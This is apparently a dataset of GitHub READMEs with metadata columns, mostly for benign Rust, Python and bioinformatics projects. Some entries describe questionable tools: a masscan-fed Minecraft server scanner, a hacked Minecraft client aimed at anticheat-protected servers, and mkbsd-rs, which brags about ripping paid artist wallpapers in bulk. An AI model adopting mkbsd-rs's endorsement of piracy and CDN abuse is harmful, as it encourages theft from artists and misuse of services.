And a special thanks to the [Astral](https://github.com/astral-sh) team for their remarkable projects, particularly [uv](https://github.com/astral-sh/uv),
from which I've learned a lot on how to write efficient and idiomatic Rust code.
",4,40,1,MIT,"build-binaries.yml,ci.yml,publish.yml,release.yml,setup-dev-drive.ps1",60.0
BaptisteRoseau/zed-typos,main,"# Typos Language Server

[Typos Language Server](https://github.com/tekumara/typos-lsp) support for Zed editor.

Typos is a spell checking tool using a list of commonly known typos, allowing it to have fewer false-positives than dictionary-based tools like [CSpell](https://github.com/streetsidesoftware/cspell).
This is a great alternative for CI/CD integration, but I would suggest using both.

## Installation

You can install this extension directly through Zed's extension marketplace.

## Configuration

The Typos extension can be configured through a `.typos.toml` configuration file, which reference can be found [here](https://github.com/crate-ci/typos/blob/master/docs/reference.md).

Additionally, you can configure it in your Zed's settings with the following:

```javascript
{
    ""lsp"": {
        ""typos"": {
            ""initialization_options"": {
                // Path to your typos config file, .typos.toml by default.
                ""config"": "".typos.toml"",
                // Path to your typos-lsp executable, takes $PATH into account.
                ""path"": ""typos-lsp"",
                // Diagnostic severity within Zed. ""Error"" by default, can be:
                // ""Error"", ""Hint"", ""Information"", ""Warning""
                ""diagnosticSeverity"": ""Error"",
                // Minimum logging level for the LSP, displayed in Zed's logs. ""info"" by default, can be:
                // ""debug"", ""error"", ""info"", ""off"", ""trace"", ""warn""
                ""logLevel"": ""info"",
                // Traces the communication between ZED and the language server. Recommended for debugging only. ""off"" by default, can be:
                // ""messages"", ""off"", ""verbose""
                ""trace.server"": ""off""
            }
        }
    }
}
```

**WARNING**: When modifying your Typos configuration either in `typos.toml` or `Cargo.toml` you will need to reload the workspace to take them into account.
You do not need to reload when editing Zed's `settings.json`.
",0,1,2,MIT,,3.0
palform/palform,main,"[![Palform logo](https://github.com/palform/palform/blob/main/readme_logo.png?raw=true)](https://palform.app)

Palform is a form builder that's:

- open source
- end-to-end encrypted
- privacy focussed (minimal third party scripts)
- full featured
- free to use [online](https://palform.app) on our European-hosted secure servers

Our _entire_ codebase is open source, including our marketing pages. This repository contains everything needed to operate the service.

## Architecture
Palform is made up of several Rust and JS components.

We use Rust with the [Rocket](https://github.com/rwf2/Rocket) framework and [SeaORM](https://github.com/SeaQL/sea-orm) on the backend. This helps maintain very high performance; the observed memory and CPU consumption in practice has been practically zero. Although implementing features is arguably more difficult, the stability guarantees are important and useful.

Database IDs are in the form of a custom TSID, with each resource type having its own prefix. Each prefix is mapped to a Rust type, reducing the risk of providing the ID of the wrong kind of resource in code.

The main frontend app is written in Svelte. OpenAPI bindings in Typescript are automatically generated using the `make frontend_openapi` command.

The `analysis` and `client-common` components are also written in Rust, containing components that are either exclusively for frontend use, or for shared use between the frontend and backend. On the frontend, these components are compiled into WASM binaries and accompanying bindings using [wasm-pack](https://github.com/rustwasm/wasm-pack). Some things like encryption and bulk analytics needs really good performance, which we've found to be massively better with WASM as opposed to native JS libraries.

We use the [Sequoia PGP](https://gitlab.com/sequoia-pgp/sequoia/-/tree/main/openpgp) library for handling form encryption and key management on both the backend and frontend.

We use [Astro](https://astro.build/) and Svelte for the landing page.

We use [Docusaurus](https://docusaurus.io/) for the blog and documentation pages.

## Contributing
We welcome contributions! Please submit a pull request with any changes, and we'll review them. Please note, we might reject some features that don't align with our mission. We want Palform to be full featured, but to avoid ""feature creep"" by introducing things that are far away from the original idea.

The copyright of any code you submit will belong to Palform Ltd, a registered company in England/UK (15796859). By submitting any code contributions, you accept this.

## Self hosting
This repository does not operate any versioned releases, so the code in the `main` branch cannot be assumed to be stable at any point. We'll implement a formal versioning system in the future.

Currently, self hosting is possible but not officially supported. We don't have any documentation on how to do it yet, but we're still working it out.

We cannot assume any liability for things that might go wrong on a self hosted instance.

## License
The source code is provided under an AGPL license. Please see LICENSE.md.
",0,0,3,AGPL-3.0,"backend.yaml,frontend.yaml,statics.yaml",0.0
althonos/pysylph,main,"# üïäÔ∏è Pysylph [![Stars](https://img.shields.io/github/stars/althonos/pysylph.svg?style=social&maxAge=3600&label=Star)](https://github.com/althonos/pysylph/stargazers)

*[PyO3](https://pyo3.rs/) bindings and Python interface to [sylph](https://github.com/bluenote-1577/sylph), an ultrafast method for containment ANI querying and taxonomic profiling.*

[![Actions](https://img.shields.io/github/actions/workflow/status/althonos/pysylph/test.yml?branch=main&logo=github&style=flat-square&maxAge=300)](https://github.com/althonos/pysylph/actions)
[![Coverage](https://img.shields.io/codecov/c/gh/althonos/pysylph/branch/main.svg?style=flat-square&maxAge=3600)](https://codecov.io/gh/althonos/pysylph/)
[![License](https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square&maxAge=2678400)](https://choosealicense.com/licenses/mit/)
[![PyPI](https://img.shields.io/pypi/v/pysylph.svg?style=flat-square&maxAge=3600)](https://pypi.org/project/pysylph)
[![Bioconda](https://img.shields.io/conda/vn/bioconda/pysylph?style=flat-square&maxAge=3600&logo=anaconda)](https://anaconda.org/bioconda/pysylph)
[![AUR](https://img.shields.io/aur/version/python-pysylph?logo=archlinux&style=flat-square&maxAge=3600)](https://aur.archlinux.org/packages/python-pysylph)
[![Wheel](https://img.shields.io/pypi/wheel/pysylph.svg?style=flat-square&maxAge=3600)](https://pypi.org/project/pysylph/#files)
[![Python Versions](https://img.shields.io/pypi/pyversions/pysylph.svg?style=flat-square&maxAge=600)](https://pypi.org/project/pysylph/#files)
[![Python Implementations](https://img.shields.io/pypi/implementation/pysylph.svg?style=flat-square&maxAge=600&label=impl)](https://pypi.org/project/pysylph/#files)
[![Source](https://img.shields.io/badge/source-GitHub-303030.svg?maxAge=2678400&style=flat-square)](https://github.com/althonos/pysylph/)
[![Mirror](https://img.shields.io/badge/mirror-LUMC-001158?style=flat-square&maxAge=2678400)](https://git.lumc.nl/mflarralde/pysylph/)
[![Issues](https://img.shields.io/github/issues/althonos/pysylph.svg?style=flat-square&maxAge=600)](https://github.com/althonos/pysylph/issues)
[![Docs](https://img.shields.io/readthedocs/pysylph/latest?style=flat-square&maxAge=600)](https://pysylph.readthedocs.io)
[![Changelog](https://img.shields.io/badge/keep%20a-changelog-8A0707.svg?maxAge=2678400&style=flat-square)](https://github.com/althonos/pysylph/blob/master/CHANGELOG.md)
[![Downloads](https://img.shields.io/pypi/dm/pysylph?style=flat-square&color=303f9f&maxAge=86400&label=downloads)](https://pepy.tech/project/pysylph)

## üó∫Ô∏è Overview

`sylph`[\[1\]](#ref1) is a method developed by [Jim Shaw](https://jim-shaw-bluenote.github.io/)
and [Yun William Yu](https://github.com/yunwilliamyu) for fast and robust
ANI querying or metagenomic profiling for metagenomic shotgun samples. It uses 
a statistical model based on Poisson coverage to compute coverage-adjusted ANI
instead of naive ANI. 

`pysylph` is a Python module, implemented using the [PyO3](https://pyo3.rs/)
framework, that provides bindings to `sylph`. It directly links to the
`sylph` code, which has the following advantages over CLI wrappers:

- **pre-built wheels**: `pysylph` is distributed on PyPI and features
  pre-built wheels for common platforms, including x86-64 and Arm64.
- **single dependency**: If your software or your analysis pipeline is
  distributed as a Python package, you can add `pysylph` as a dependency to
  your project, and stop worrying about the `sylph` binary being present on
  the end-user machine.
- **sans I/O**: Everything happens in memory, in Python objects you control,
  making it easier to pass your sequences to `pysylph` without having to write
  them to a temporary file.

*This library is still a work-in-progress, and in an experimental stage, with
API breaks very likely between minor versions*.


## üîß Installing

Pysylph can be installed directly from [PyPI](https://pypi.org/project/pysylph/),
which hosts some pre-built CPython wheels for x86-64 platforms, as well as the 
code required to compile from source with Rust and [maturin](https://www.maturin.rs/):
```console
$ pip install pysylph
```

## üîñ Citation

Pysylph is scientific software, and builds on top of `sylph`. Please cite 
[`sylph`](https://github.com/bluenote-1577/sylph) if you are using it in
an academic work, for instance as:

> `pysylph`, a Python library binding to `sylph` (Shaw & Yu, 2024).


## üí° Examples

### üî® Creating a database

A database is a collection of genomes sketched for fast querying. 

Here is how to create a database into memory, using 
[Biopython](https://github.com/biopython/biopython) to load genomes:

```python
sketcher = pysylph.Sketcher()
sketches = []

for path in pathlib.Path(""."").glob(""*.fasta""):
    contigs = [ str(record.seq) for record in Bio.SeqIO.parse(path, ""fasta"") ]
    sketch = sketcher.sketch_genome(name=path.stem, contigs=contigs)
    sketches.append(sketch)

database = pysylph.Database(sketches)
```

`Sketcher` methods are re-entrant and can be used to sketch multiple genomes
in parallel using for instance a [`ThreadPool`](https://docs.python.org/3/library/multiprocessing.html#multiprocessing.pool.ThreadPool).

### üìù Saving a database

The database can be saved to the binary format used by the `sylph` binary as
well:

```python
database.dump(""genomes.syldb"")
```

### üóíÔ∏è Loading a database

A database previously created with `sylph` can be loaded transparently in 
`pysylph`:

```python
database = pysylph.Database.load(""genomes.syldb"")
```

### üìä Sketching a query

Samples must also be sketched before they can be used to query a database.
Here is how to sketch a sample made of single-ended reads stored in FASTQ 
format:

```python
reads = [str(record.seq) for record in Bio.SeqIO.parse(""sample.fastq"", ""fastq"")]
sample = sketcher.sketch_single(name=""sample"", reads=reads)
```

### üî¨ Querying a database

Once a sample has been sketched, it can be used to query a database for ANI
containment or taxonomic profiling:

```python
profiler = pysylph.Profiler()
results = profiler.query(sample, database)   # ANI containment
results = profiler.profile(sample, database) # taxonomic profiling
```

`Profiler` methods are re-entrant and can be used to query a database with
multiple samples in parallel using for instance a 
[`ThreadPool`](https://docs.python.org/3/library/multiprocessing.html#multiprocessing.pool.ThreadPool).

## üîé See Also

Computing ANI for closed genomes? You may also be interested in
[`pyskani`, a Python package for computing ANI](https://github.com/althonos/pyskani) binding to [`skani`](https://github.com/bluenote-1577/skani), which
was developed by the same authors.

## üí≠ Feedback

### ‚ö†Ô∏è Issue Tracker

Found a bug ? Have an enhancement request ? Head over to the
[GitHub issue tracker](https://github.com/althonos/pysylph/issues) if you need
to report or ask something. If you are filing in on a bug, please include as
much information as you can about the issue, and try to recreate the same bug
in a simple, easily reproducible situation.

### üèóÔ∏è Contributing

Contributions are more than welcome! See
[`CONTRIBUTING.md`](https://github.com/althonos/pysylph/blob/master/CONTRIBUTING.md)
for more details.


## ‚öñÔ∏è License

This library is provided under the [MIT License](https://choosealicense.com/licenses/mit/). 
It contains some code included verbatim from the the `sylph` source code, which 
was written by [Jim Shaw](https://jim-shaw-bluenote.github.io/) and is distributed 
under the terms of the [MIT License](https://choosealicense.com/licenses/mit/)
as well. Source distributions of `pysylph` vendors additional sources under their 
own terms using the [`cargo vendor`](https://doc.rust-lang.org/cargo/commands/cargo-vendor.html)
command.

*This project is in no way not affiliated, sponsored, or otherwise endorsed
by the [original `sylph` authors](https://jim-shaw-bluenote.github.io/).
It was developed by [Martin Larralde](https://github.com/althonos/) during his
PhD project at the [Leiden University Medical Center](https://www.lumc.nl/en/)
in the [Zeller team](https://github.com/zellerlab).*

## üìö References

- <a id=""ref1"">\[1\]</a> Jim Shaw and Yun William Yu. Rapid species-level metagenome profiling and containment estimation with sylph (2024). Nature Biotechnology. [10.1038/s41587-024-02412-y](https://doi.org/10.1038/s41587-024-02412-y). [PMID:39379646](https://pubmed.ncbi.nlm.nih.gov/39379646)
",2,0,2,MIT,"publish.yml,requirements.txt,test.yml",0.0
stjude-rust-labs/crankshaft,main,"<img style=""margin: 0px"" alt=""Repository Header Image"" src=""./assets/repo-header.png"" />
<hr/>

<p align=""center"">
  <p align=""center"">
    <a href=""https://github.com/stjude-rust-labs/crankshaft/actions/workflows/CI.yml"" target=""_blank"">
      <img alt=""CI: Status"" src=""https://github.com/stjude-rust-labs/crankshaft/actions/workflows/CI.yml/badge.svg"" />
    </a>
    <a href=""https://crates.io/crates/crankshaft"" target=""_blank"">
      <img alt=""crates.io version"" src=""https://img.shields.io/crates/v/crankshaft"">
    </a>
    <a href=""https://rustseq.zulipchat.com"" target=""_blank"">
      <img alt=""CI: Status"" src=""https://img.shields.io/badge/chat-%23workflows--lib--crankshaft-blue?logo=zulip&logoColor=f6f6f6"" />
    </a>
    <img alt=""crates.io downloads"" src=""https://img.shields.io/crates/d/crankshaft"">
  </p>

  <p align=""center"">
    A headless workflow execution engine for bioinformatics that supports local, cloud, and HPC.
    <br />
    <br />
    <a href=""https://github.com/stjude-rust-labs/crankshaft/issues/new?assignees=&title=Descriptive%20Title&labels=enhancement"">Request Feature</a>
    ¬∑
    <a href=""https://github.com/stjude-rust-labs/crankshaft/issues/new?assignees=&title=Descriptive%20Title&labels=bug"">Report Bug</a>
    ¬∑
    ‚≠ê Consider starring the repo! ‚≠ê
    <br />
  </p>
</p>

## Overview

`crankshaft` is a headless workflow execution engine written in Rust: it's being
developed in coordination with the [`sprocket`] project with the goal of
enabling large-scale bioinformatics analyses. There is no associated
`crankshaft` command line tool‚Äîthe end user is really engine _developers_ who
want to include it as a core task execution library in their own command line
tools.

## Guiding Principles

- `crankshaft` aims to be a **high-performance** workflow execution engine
  capable of concurrently managing and executing upwards of 20,000 concurrent
  tasks. The core focus is enabling middle- to large-scale bioinformatics
  analyses, though it can also be used to design smaller scale execution
  engines.
- `crankshaft` is **headless**, which means that it doesn't do anything on its
  own; in fact, it _must_ be driven by some external orchestration code. This
  allows the `crankshaft` library itself to focus on performance improvements
  that can be enjoyed across the entire community.
- `crankshaft` is developed **independently of any particular workflow
  language**. Though it's part of the Sprocket project, it's not based on WDL,
  and, in theory, multiple frontends based on different workflow
  languages can exist (and we hope this is the case)!

## üìö Getting Started

### Installation

To use `crankshaft`, you'll need to install [Rust](https://www.rust-lang.org/).
We recommend using [rustup](https://rustup.rs/) to accomplish this. Once Rust is
installed, you can create a new project and add the latest version of
`crankshaft` using the following command.

```bash
cargo add crankshaft
```

Once you've added `crankshaft` to your dependencies, you should head over to the
[`/examples`](https://github.com/stjude-rust-labs/crankshaft/tree/main/crankshaft/examples)
to see how you can use the library in your projects.

## üñ•Ô∏è Development

To bootstrap a development environment, please use the following commands.

```bash
# Clone the repository
git clone git@github.com:stjude-rust-labs/crankshaft.git
cd crankshaft

# Build the crate in release mode
cargo build --release
```

## üößÔ∏è Tests

Before submitting any pull requests, please make sure the code passes the
following checks (from the root directory).

```bash
# Run the project's tests.
cargo test --all-features

# Run the tests for the examples.
cargo test --examples --all-features

# Ensure the project doesn't have any linting warnings.
cargo clippy --all-features

# Ensure the project passes `cargo fmt`.
cargo fmt --check

# Ensure the docs build.
cargo doc
```

## ü§ù Contributing

Contributions, issues and feature requests are welcome! Feel free to check
[issues page](https://github.com/stjude-rust-labs/crankshaft/issues).

## üìù License

This project is licensed as either [Apache 2.0][license-apache] or
[MIT][license-mit] at your discretion. Additionally, please see [the
disclaimer](https://github.com/stjude-rust-labs#disclaimer) that applies to all
crates and command line tools made available by St. Jude Rust Labs.

Copyright ¬© 2024-Present [St. Jude Children's Research Hospital](https://github.com/stjude).

[license-apache]: https://github.com/stjude-rust-labs/crankshaft/blob/main/LICENSE-APACHE
[license-mit]: https://github.com/stjude-rust-labs/crankshaft/blob/main/LICENSE-MIT
[`sprocket`]: https://github.com/stjude-rust-labs/sprocket
",0,0,1,Apache-2.0,CI.yml,2.0
pkgforge/soar,main,"# Soar Package Manager

<div align=""center"">

[crates-shield]: https://img.shields.io/crates/v/soar-cli
[crates-url]: https://crates.io/crates/soar-cli
[stars-shield]: https://img.shields.io/github/stars/pkgforge/soar.svg
[stars-url]: https://github.com/pkgforge/soar/stargazers
[issues-shield]: https://img.shields.io/github/issues/pkgforge/soar.svg
[issues-url]: https://github.com/pkgforge/soar/issues
[license-shield]: https://img.shields.io/github/license/pkgforge/soar.svg
[license-url]: https://github.com/pkgforge/soar/blob/main/LICENSE
[doc-shield]: https://img.shields.io/badge/docs-soar.qaidvoid.dev-blue
[doc-url]: https://soar.qaidvoid.dev

[![Crates.io][crates-shield]][crates-url]
[![Documentation][doc-shield]][doc-url]
[![Issues][issues-shield]][issues-url]
[![License: MIT][license-shield]][license-url]
[![Stars][stars-shield]][stars-url]

</div>

<p align=""center"">
    <img src=""icons/hicolor/scalable/apps/soar.svg"" alt=""soar"" width=""256""/>
</p>

<p align=""center"">
    Soar is a fast Linux package manager that doesn't suck. Works with static binaries, AppImages, and other portable stuff.
</p>

<div align=""center"">

| <img src=""https://raw.githubusercontent.com/pkgforge/soar/refs/heads/autoplay/install.webp"" /> | <img src=""https://raw.githubusercontent.com/pkgforge/soar/refs/heads/autoplay/remove.webp"" /> | <img src=""https://raw.githubusercontent.com/pkgforge/soar/refs/heads/autoplay/download.webp"" /> | 
| - | - | - |
| [**`Install Packages`**](https://soar.qaidvoid.dev/install) | [**`Remove Packages`**](https://soar.qaidvoid.dev/remove) | [**`Download File`**](https://soar.qaidvoid.dev/download) |
| <img src=""https://raw.githubusercontent.com/pkgforge/soar/refs/heads/autoplay/run.webp"" /> | <img src=""https://raw.githubusercontent.com/pkgforge/soar/refs/heads/autoplay/list.webp"" /> | <img src=""https://raw.githubusercontent.com/pkgforge/soar/refs/heads/autoplay/search.webp"" /> |
| [**`Run Package`**](https://soar.qaidvoid.dev/run) | [**`List Packages`**](https://soar.qaidvoid.dev/list) | [**`Search Packages`**](https://soar.qaidvoid.dev/search) |

</div>

## üåü Key Features
- [Universal Package Support](https://soar.qaidvoid.dev/#universal-package-support)
- [Desktop Integration](https://soar.qaidvoid.dev/#desktop-integration)

## üîß Installation
Installation guide can be found [here](https://soar.qaidvoid.dev/installation.html).

## üéØ Usage

```sh
Usage: soar [OPTIONS] <COMMAND>

Commands:
  install    Install packages [aliases: i, add]
  search     Search package [aliases: s, find]
  query      Query package info [aliases: Q]
  remove     Remove packages [aliases: r, del]
  sync       Sync with remote metadata [aliases: S, fetch]
  update     Update packages [aliases: u, upgrade]
  info       Show info about installed packages [aliases: list-installed]
  list       List all available packages [aliases: ls]
  log        Inspect package build log
  inspect    Inspect package build script
  run        Run packages without installing to PATH [aliases: exec, execute]
  use        Use package from different family
  download   Download arbitrary files [aliases: dl]
  health     Health check
  defconfig  Generate default config
  env        View env
  help       Print this message or the help of the given subcommand(s)

Options:
  -v, --verbose...  
  -q, --quiet       
  -j, --json        
  -h, --help        Print help
  -V, --version     Print version
```

## ‚öôÔ∏è Configuration

Soar uses a JSON configuration file located at `~/.config/soar/config.json`.
For configuration guide, follow [here](https://soar.qaidvoid.dev/configuration.html).

## ü§ù Contributing

We welcome contributions! Please feel free to fork the repository and submit
pull requests. If you have suggestions or feature requests, open an issue to
discuss.

Please feel free to:
1. Fork the repository
2. Create your feature branch
3. Submit a pull request

## üìù License

This project is licensed under [MIT] - see the [LICENSE](LICENSE) file for details.
",14,0,2,MIT,"auto-assign.yaml,nightly.yaml,release.yaml",1.0
Funtimes909/ServerSeekerV2,main,"# ServerSeekerV2

ServerSeekerV2 is a full rewrite of the original ServerSeeker in Java, it takes a JSON output file from [masscan](https://github.com/robertdavidgraham/masscan).  
Using that as input it asynchronously pings each IP address, on the port returned with a [Server List Ping](https://wiki.vg/Server_List_Ping) which returns the servers information, this information then gets stored in a PostgreSQL database.
Unlike the original ServerSeeker, V2 has some extra features:
- Faster
- Open Source
- Configurable
- Self Hostable (Host your own scanner and database!)
- Support for searching servers based on Forge mods
- Being able to detect if (some) servers are running as a cracked server

**Please also note!!**
This is just a backend, there's no frontend for easily searching for servers from the database yet, I will make a discord bot and a page on my website to do this in time, so don't worry

## Currently under heavy development!!
ServerSeekerV2 is **NOT** production ready! Please report any issues that you find, although I'm probably aware of most of them already, it would be good to track them.

Currently lacking features:
- Async and concurrency support (it will be unusably slow for large scans)
- General code cleanup and refactoring

Some longer term goals I would like to add:
- Bedrock support
- Support for scanning across multiple servers for increased scanning speed

## Getting Started
Currently, there are no prebuilt jars, you will have to build it yourself, thankfully this is easy, simply clone or download the repository locally and run `./gradlew buildShadow` the jar should be in the build/libs folder

To get information about the servers IP address (country, ASN), you will need to make an account with [IpInfo](https://ipinfo.io), after making an account, go to your dashboard and your token should be at the bottom of the page, put this token in the config.json file

## Storing data in the database

To store information in a database you will need to set up PostgreSQL:  

### Installation
#### Ubuntu
```sh
sudo apt-get install postgresql
```
#### Arch
```sh
sudo pacman -S postgresql
```

  
### Configuration
```sh
sudo -u postgres psql
```
After that you should get a terminal like this  
```
postgres=#
```  
Run the commands below to create a new user:  
```sql
ALTER USER postgres with encrypted password 'your_password';
```
Then put the new password in the `config.json` file.

## Special thanks
- [EngurRuzgar](https://github.com/EngurRuzgar): Documentation and providing me with valid testing servers
- [coolGi](https://github.com/coolGi69): Code cleanup and general tips
",0,0,1,GPL-3.0,,3.0
iM4dCat/Alien,main,"## AlienClient
no rat here

now Alien v2(mc1.21.1) is free but not open source

I will maintain Alien v2

You can report bugs or request changes(Open Issues)

If you have any questions, you can contact me on discord(kizuatoresult)

##
- Minecraft version **```Fabric 1.20.4```**
- Default ClickGui KeyBind **```Y```**
- Default Prefix **```;```**

<details>
<summary>Supported Servers</summary>
  
- 2b2t.xin
- 2b2tpvp.cn
- 3c3u.org
- 2b2tpvp.net
- crystalpvp.cc
- and servers with NoCheatPlus or Grim AntiCheat
</details>

<details>
<summary>ScreenShot</summary>
  
![image](screenshot.png)
</details>

## License
GNU General Public License v3.
## Credits
- https://github.com/coltonk9043/Aoba-MC-Hacked-Client
- https://github.com/qualterz/lookaround
- https://github.com/Pan4ur/ThunderHack-Recode
- https://github.com/Ladysnake/Satin
- https://github.com/MeteorDevelopment/meteor-client
- https://github.com/cabaletta/baritone
- https://github.com/The-Fireplace-Minecraft-Mods/In-Game-Account-Switcher
",2,2,1,GPL-3.0,,0.0
TobiasBengtsson/crc-fast-rs,master,"# crc-fast-rs

This is a CRC algorithm generator with SIMD support. Apart from the generator,
contains the cargo roots for all generated CRC algorithms.

## How the repository works

The `gen_crates.sh` generates all the specific CRC algorithm crates using the
template directory `crc-crate-template` based on the algorithm list in
`algos.csv`.

The generated `lib.rs` file contains a single expression `crc!(...)` and a
dependency on the `crc-fast-gen` crate which contains the proc macro logic.

### Example

In this example, make some change to the template `Cargo.toml` file and re-
generate the crates.

```
~/crc-fast-rs $ vim crc-crate-template/Cargo.toml
(make changes and save)
~/crc-fast-rs $ ./gen_crates.sh
~/crc-fast-rs $ git diff
```

When the general version is bumped, the crates have to be re-generated.

```
~/crc-fast-rs $ echo 'v0.2.1' > version.txt
~/crc-fast-rs $ ./gen_crates.sh
```

## Versioning

In general, the crates are in sync with the version of this repository. For
hotfixes to individual crates, patch versions may be applied to only the
affected crate(s). If so, the next bump of the general repository will skip
those versions for clarity.

The general repository versions is typically bumped on changes to the generating
logic. It is stored in [version.txt](version.txt) used in the generation of the
crates.

## Benchmarks

Performance is the main raison d'√™tre of this project. Therefore there are
plenty of benchmarks of the CRC algorithms.

Each CRC implementation is benchmarked for SIMD, table lookup, and simple loop
peformance using criterion. Input size in bytes range from 128 to 64k in powers
of 2.

In the future (TODO), the benchmarks will be run on a set of
architectures/families and the results published.

### Example

```
~/crc-fast-rs $ cargo bench
```

## Questions

**Why one crate per algorithm and not just one crate?**

- In general, granular crates are preferred in the Rust ecosystem.
- From a consumer point of view, it's unlikely you'll need more than 1 or 2 CRCs
  for a given application. Explicit crates per algorithm makes it clearer which
  one you're depending on.
- It makes it possible to pre-expand the code (in the future, WIP) without
  bloating a single crate (making it slow to download, among other things).
  Pre-expanding will also improve compilation times.
- It's easier to review the expanded code of a single algorithm for e.g.
  security compared to the complicated macro.
- It's easier to hotfix if there is a problem with a single algorithm
- Better statistics on CRC populatity, that can guide future development

## License

Everything is licensed under the MIT license (see [LICENSE](LICENSE)).

## References

- https://reveng.sourceforge.io/crc-catalogue/ good collection of CRC:s with all
  the relevant parameters
- https://crccalc.com/ used to double-check some values
",0,5,5,MIT,rust.yml,3.0
TheDonSaysNah/checkhomeIP,main,"# CheckHomeIP

A small and lightweight program to monitor your home IP 24/7 and send an email to yourself using SMTP. Useful for people who don't have DDNS and need to know if their ISP assigned IP has been changed.

## Getting started
To get started, fill out `checkip.env` with the SMTP host and credentials you wish to use. Thats it! Just compile and run.

*This has only been tested with GMail SMTP. Other hosts may not work.*

### Systemd service setup
To enable systemd service automation, edit `checkip.service` and change the lines containing `ExecStart=` and `WorkingDirectory=` to where the binary is in your filesystem. Be sure to put the folder path and not binary path for `WorkingDirectory=`

Once done, change the line `User=user` to the user account you wish the service to run as and copy/move the file to `/etc/systemd/system/`

Finally, enable the service and start it using `systemctl enable --now checkip.service`

",0,2,1,MIT,,1.0
korewaChino/mkbsd-rs,main,"# mkbsd-rs

A port of [mkbsd](https://github.com/nadimkobeissi/mkbsd) in (Multi-threaded) Rust

Rip Mark-ass Brownlee's wallpapers at blazingly fast speeds! üöÄ

This Rust program makes use of [tokio](https://tokio.rs/) to parallelize the process of downloading all the wallpapers from the Panels API, allowing all wallpapers
to be downloaded simultaneously.

This version attempts to parse the full spec JSON from the API and downloads _every_ single image, in every single gallery, in every single form factor, essentially doing a full
rip of the entire backend storage from [imgix](https://imgix.com)

Here's an output of the full rip:

![image](./assets/folder.png)

This program has two backends for downloading files:

- The original verbose mode, which downloads all the images using the ""API"" bucket which includes every pre-cropped form factor. This uses a lot of storage so be warned.
- The ""simple"" mode, which crawls the CDN manifests and downloads the original images from there.

By default, the simple mode will be selected to save storage.

## Why?

1. the original code isn't fast enough for me I have a 1GbE connection
2. This thing is embarrassingly parallel
3. I love free shit
4. My 1GbE plan is cheaper than this app
5. spamming imgix is funny

## Aren't you stealing from artists?

yea, but so is piracy in general. if you really like what you see just pay for it, see `LICENSE` for my full opinion

## Usage

1. [Get Rust](https://rustup.rs)
2. Clone this project and enter the project directory
3. `cargo run --release`
4. Wait

All the images should appear in the `downloads` directory.

For more options, refer to the help page in the command (`--help`)

## License

Do whatever the fuck you want.
",0,0,1,Unlicense,,0.0
cairoeth/sp1-eof,main,"# SP1 performance with EOF üèéÔ∏è

EVM Object Format (EOF) is an upgrade to the Ethereum Virtual Machine (EVM) that introduces an extensible and versioned container format for EVM bytecode with a once-off validation at deploy time, focusing on separating code and data, enhancing code validation, and improving overall efficiency.

This repository benchmarks the performance of the Revm EOF and legacy EVM interpreters in SP1. 

## Results

The following table shows the performance of the EOF-based and legacy EVM interpreters for the Fibonacci contract. As can be observed, the EOF-based program is 2.9 times more efficient for the total and interpreter cycles (65.80% fewer cycles required) and gas. It also runs 2.69 times faster and has a proof size 2.04 times smaller.

| Program    | Set up input (cycles) | Set up runtime (cycles) | Interpreter (cycles) | Total (cycles) | E2E time (s) | kHz   | Proof size |
|------------|----------------------:|------------------------:|---------------------:|---------------:|-------------:|------:|-----------:|
| EOF        |                23,276 |                  11,193 |            3,112,476 |      3,158,346 |        58.86 | 53.66 |  8,087,802 |
| Legacy EVM |                42,709 |                  11,188 |            9,101,063 |      9,166,261 |       158.47 | 57.84 | 16,489,434 |

## Running

To run the benchmarks, go to the `revm/script` directory and run:

- EOF: `RUST_LOG=info EOF=true cargo run --release`
- Legacy EVM: `RUST_LOG=info EOF=false cargo run --release`

The setup costs are roughly fixed, but the ""run interpreter"" section is responsible for executing the actual instructions of the Revm programs. The EOF bytecode of the contract can be obtained by running `forge inspect MyFib deployedBytecode` in the `solidity` directory.
",0,0,1,,"rust.yml,solidity.yml",0.0
kby-ai/FaceRecognition-Ionic-Cordova,main,"<p align=""center"">
  <a href=""https://play.google.com/store/apps/dev?id=7086930298279250852"" target=""_blank"">
    <img alt="""" src=""https://github-production-user-asset-6210df.s3.amazonaws.com/125717930/246971879-8ce757c3-90dc-438d-807f-3f3d29ddc064.png"" width=500/>
  </a>  
</p>

#### ü§ó Hugging Face - [Here](https://huggingface.co/kby-ai) <span> <img src=""https://github.com/kby-ai/.github/assets/125717930/bcf351c5-8b7a-496e-a8f9-c236eb8ad59e"" style=""margin: 4px; width: 36px; height: 20px""> <span/>
#### üìö Product & Resources - [Here](https://github.com/kby-ai/Product)
#### üõü Help Center - [Here](https://docs.kby-ai.com)
#### üíº KYC Verification Demo - [Here](https://github.com/kby-ai/KYC-Verification-Demo-Android)
#### üôã‚Äç‚ôÄÔ∏è Docker Hub - [Here](https://hub.docker.com/u/kbyai)

# FaceRecognition-Ionic-Cordova
This repository demonstrates both `face liveness detectio`n and `face recognition` technology for `Ionic Cordova` on `Android` and `iOS` platforms.

> In this repository, we integrated `KBY-AI`'s `face liveness detection` and `face recognition` technology into this `Flutter` project for both `Android` and `iOS`.</br>
### ‚óæFaceSDK(Mobile) Details

  | Basic      | üîΩ Standard | Premium |
  |------------------|------------------|------------------|
  | Face Detection        | <b>Face Detection</b>    | Face Detection |
  | Face Liveness Detection        | <b>Face Liveness Detection</b>    | Face Liveness Detection |
  | Pose Estimation        | <b>Pose Estimation</b>    | Pose Estimation |
  |         | <b>Face Recognition</b>    | Face Recognition |
  |         |         | 68 points Face Landmark Detection |
  |         |         | Face Quality Calculation |
  |         |         | Face Occlusion Detection |
  |         |         | Eye Closure Detection |
  |         |         | Age, Gender Estimation |

### ‚óæFaceSDK(Mobile) Product List
  | No.      | Repository | SDK Details |
  |------------------|------------------|------------------|
  | 1        | [Face Liveness Detection - Android](https://github.com/kby-ai/FaceLivenessDetection-Android)    | Basic SDK |
  | 2        | [Face Liveness Detection - iOS](https://github.com/kby-ai/FaceLivenessDetection-iOS)    | Basic SDK |
  | 3        | [Face Recognition - Android](https://github.com/kby-ai/FaceRecognition-Android)    | Standard SDK |
  | 4        | [Face Recognition - iOS](https://github.com/kby-ai/FaceRecognition-iOS)    | Standard SDK |
  | 5        | [Face Recognition - Flutter](https://github.com/kby-ai/FaceRecognition-Flutter)        | Standard SDK |
  | ‚û°Ô∏è        | <b>[Face Recognition - Ionic-Cordova](https://github.com/kby-ai/FaceRececogniion-Ionic-Cordova)</b>        | <b>Standard SDK</b> |
  | 7        | [Face Recognition - React-Native](https://github.com/kby-ai/FaceRecognition-React-Native)        | Standard SDK |
